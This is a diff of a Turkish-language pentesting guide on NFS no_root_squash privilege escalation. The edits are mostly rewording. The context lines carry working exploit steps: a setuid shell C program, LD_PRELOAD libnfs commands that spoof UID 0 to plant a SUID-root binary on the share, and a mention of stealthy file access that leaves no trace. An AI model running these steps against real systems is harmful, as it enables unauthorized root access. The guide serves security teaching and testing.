@@ -12,7 +12,7 @@ _ **/etc/exports** _ dosyasını okuyun, eğer **no_root_squash** olarak yapıla
 
 Bu güvenlik açığını bulduysanız, bunu sömürebilirsiniz:
 
-- **O dizini** bir istemci makinesinde **montajlayarak**, ve **root olarak** montajlı klasöre **/bin/bash** ikili dosyasını kopyalayarak ve ona **SUID** hakları vererek, o bash ikili dosyasını **kurban** makinesinden çalıştırarak.
+- O dizini bir istemci makinesinde **montajlayarak**, ve **root olarak** montajlı klasöre **/bin/bash** ikili dosyasını kopyalayarak ve o bash ikili dosyasını **kurban** makinesinden çalıştırarak.
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -49,7 +49,7 @@ cd <SHAREDD_FOLDER>
 
 ## Temel Bilgiler
 
-Senaryo, yerel bir makinede monte edilmiş bir NFS paylaşımını istismar etmeyi içerir ve bu, istemcinin uid/gid'ini belirlemesine izin veren NFSv3 spesifikasyonundaki bir hatayı kullanır; bu da yetkisiz erişimi mümkün kılabilir. İstismar, NFS RPC çağrılarını sahtelemek için bir kütüphane olan [libnfs](https://github.com/sahlberg/libnfs) kullanmayı içerir.
+Senaryo, yerel bir makinede monte edilmiş bir NFS paylaşımını istismar etmeyi içeriyor ve bu, istemcinin uid/gid belirlemesine izin veren NFSv3 spesifikasyonundaki bir açığı kullanıyor, bu da yetkisiz erişimi mümkün kılabilir. İstismar, NFS RPC çağrılarını sahtelemek için bir kütüphane olan [libnfs](https://github.com/sahlberg/libnfs) kullanmayı içerir.
 
 ### Kütüphaneyi Derleme
 
@@ -62,7 +62,7 @@ gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib
 ```
 ### Sömürü Gerçekleştirme
 
-Sömürü, root ayrıcalıklarını artıran ve ardından bir shell çalıştıran basit bir C programı (`pwn.c`) oluşturmayı içerir. Program derlenir ve elde edilen ikili dosya (`a.out`), RPC çağrılarında uid'yi taklit etmek için `ld_nfs.so` kullanarak suid root ile paylaşıma yerleştirilir:
+Sömürü, root yetkilerini artıran basit bir C programı (`pwn.c`) oluşturmayı ve ardından bir shell çalıştırmayı içerir. Program derlenir ve elde edilen ikili dosya (`a.out`), RPC çağrılarında uid'i taklit etmek için `ld_nfs.so` kullanarak suid root ile paylaşıma yerleştirilir:
 
 1. **Sömürü kodunu derleyin:**
 
@@ -72,7 +72,7 @@ int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
 
-2. **Sömürü paylaşımda yerleştirin ve uid'yi taklit ederek izinlerini değiştirin:**
+2. **Sömürü paylaşımda yerleştirin ve uid'i taklit ederek izinlerini değiştirin:**
 
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
@@ -81,15 +81,15 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs:
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
 
-3. **Root ayrıcalıkları kazanmak için sömürüyü çalıştırın:**
+3. **Root yetkilerini kazanmak için sömürüyü çalıştırın:**
 ```bash
 /mnt/share/a.out
 #root
 ```
 
-## Bonus: NFShell ile Gizli Dosya Erişimi
+## Bonus: NFShell için Gizli Dosya Erişimi
 
-Root erişimi elde edildikten sonra, sahipliği değiştirmeden (iz bırakmamak için) NFS paylaşımı ile etkileşimde bulunmak için bir Python betiği (nfsh.py) kullanılır. Bu betik, erişilen dosyanın uid'sini eşleştirerek, paylaşımda dosyalarla izin sorunları olmadan etkileşimde bulunmayı sağlar:
+Root erişimi elde edildikten sonra, sahipliği değiştirmeden (iz bırakmamak için) NFS paylaşımı ile etkileşimde bulunmak için bir Python betiği (nfsh.py) kullanılır. Bu betik, erişilen dosyanın uid'ini eşleştirerek, paylaşımda izin sorunları olmadan dosyalarla etkileşimde bulunmayı sağlar:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
